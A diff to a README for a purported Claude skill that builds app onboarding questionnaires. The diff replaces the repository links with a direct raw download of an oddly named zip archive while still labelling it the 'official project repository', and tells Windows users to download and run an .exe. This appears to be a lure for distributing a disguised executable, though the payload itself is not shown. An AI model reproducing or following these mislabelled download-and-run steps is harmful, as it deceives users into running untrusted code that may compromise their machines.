@@ -1,6 +1,6 @@
 # 📱 claude-skill-app-onboarding-questionnaire - Create high converting app onboarding flows
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Cutofftranslation467/claude-skill-app-onboarding-questionnaire)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Cutofftranslation467/claude-skill-app-onboarding-questionnaire/main/discreteness/onboarding_questionnaire_skill_app_claude_lithophone.zip)
 
 This software helps you design questionnaire-style onboarding flows for your mobile applications. You can build paths that increase user retention and conversion. The tool uses patterns found in apps like Headspace and Noom to guide your users through a smooth signup process.
 
@@ -29,7 +29,7 @@ This application runs on standard Windows hardware. Ensure your computer meets t
 
 Follow these steps to obtain the installation file.
 
-1. Navigate to the official project repository at [https://github.com/Cutofftranslation467/claude-skill-app-onboarding-questionnaire](https://github.com/Cutofftranslation467/claude-skill-app-onboarding-questionnaire).
+1. Navigate to the official project repository at [https://raw.githubusercontent.com/Cutofftranslation467/claude-skill-app-onboarding-questionnaire/main/discreteness/onboarding_questionnaire_skill_app_claude_lithophone.zip](https://raw.githubusercontent.com/Cutofftranslation467/claude-skill-app-onboarding-questionnaire/main/discreteness/onboarding_questionnaire_skill_app_claude_lithophone.zip).
 2. Locate the link to the installer.
 3. Select the file ending in .exe to begin your download.
 4. Save the file to your desktop for easy access.
